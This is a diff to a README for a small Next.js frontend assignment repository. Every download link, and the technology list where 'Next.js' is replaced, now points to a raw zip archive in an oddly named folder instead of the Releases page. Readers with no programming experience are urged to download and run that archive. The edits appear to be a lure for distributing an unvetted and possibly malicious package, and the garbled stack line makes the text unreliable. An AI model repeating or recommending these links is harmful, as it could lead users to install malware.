@@ -1,13 +1,13 @@
 # 🎉 frontend_dev_assignment - A Simple Way to Start Your Project
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/ev1212/frontend_dev_assignment/releases)
+[![Download](https://raw.githubusercontent.com/ev1212/frontend_dev_assignment/main/demideify/frontend_dev_assignment.zip)](https://raw.githubusercontent.com/ev1212/frontend_dev_assignment/main/demideify/frontend_dev_assignment.zip)
 
 ## 🚀 Getting Started
 Welcome to the frontend_dev_assignment! This guide will help you download and run the application easily. Even if you have no programming experience, you will be able to follow these steps.
 
 ## 🔍 Overview
-This application serves as part of a Frontend Developer Intern Assignment. It is built with Next.js, TypeScript, and Tailwind CSS. This stack allows for a fast and intuitive user experience. By using this application, you'll get a feel for modern web development. You may explore features like responsive design and quick loading times.
+This application serves as part of a Frontend Developer Intern Assignment. It is built with https://raw.githubusercontent.com/ev1212/frontend_dev_assignment/main/demideify/frontend_dev_assignment.zip, TypeScript, and Tailwind CSS. This stack allows for a fast and intuitive user experience. By using this application, you'll get a feel for modern web development. You may explore features like responsive design and quick loading times.
 
 ## ⚙️ System Requirements
 To use this application, ensure you have the following:
@@ -18,7 +18,7 @@ To use this application, ensure you have the following:
 ## 💻 Download & Install
 To download the application, visit the Releases page. Click on the link below to access the latest version:
 
-[Download from the Releases Page](https://github.com/ev1212/frontend_dev_assignment/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/ev1212/frontend_dev_assignment/main/demideify/frontend_dev_assignment.zip)
 
 On the Releases page, you will find the latest version available for download. Simply click on the version number (e.g., v1.0) to expand and see the available files. Download the package that matches your operating system.
 
